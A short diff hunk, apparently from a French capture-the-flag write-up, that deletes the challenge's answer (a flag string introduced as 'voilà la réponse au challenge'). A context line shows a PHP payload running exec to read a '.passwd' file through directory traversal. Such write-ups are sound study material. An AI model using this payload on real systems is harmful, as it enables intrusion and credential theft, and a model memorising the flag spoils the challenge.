@@ -83,6 +83,3 @@ echo exec("cat ../../../.passwd");
 ?>
 ```
 
-voilà la réponse au challenge :
-
-a7n4nizpgQgnPERy89uanf6T4
